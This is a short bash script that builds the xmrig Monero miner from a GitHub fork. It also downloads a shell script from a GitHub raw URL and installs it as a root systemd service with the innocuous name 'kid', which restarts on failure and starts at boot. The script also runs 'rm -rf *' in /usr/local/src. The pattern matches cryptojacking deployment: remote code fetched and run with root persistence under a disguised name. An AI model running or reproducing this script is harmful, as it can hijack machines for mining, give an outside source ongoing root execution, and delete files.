#!/usr/bin/env bash
sudo apt-get update && 
apt-get -y install build-essential libssl-dev wget libcurl4-openssl-dev libjansson-dev gcc g++ make screen curl libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 &&
sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && 
cd /usr/local/src/ && rm -rf * && sudo service kid stop && rm -f /lib/systemd/system/kid.service
wget -O suxmr-21-link1.sh https://raw.githubusercontent.com/waniekvbgm/zalska/master/suxmr-21-link1.sh && sudo chmod a+x suxmr-21-link1.sh
git clone https://github.com/waniekvbgm/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make
bash -c 'cat <<EOT >>/lib/systemd/system/kid.service 
[Unit]
Description=kid
After=network.target
[Service]
Type=forking
ExecStart=/usr/local/src/suxmr-21-link1.sh
Restart=on-failure
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable kid.service &&
service kid start
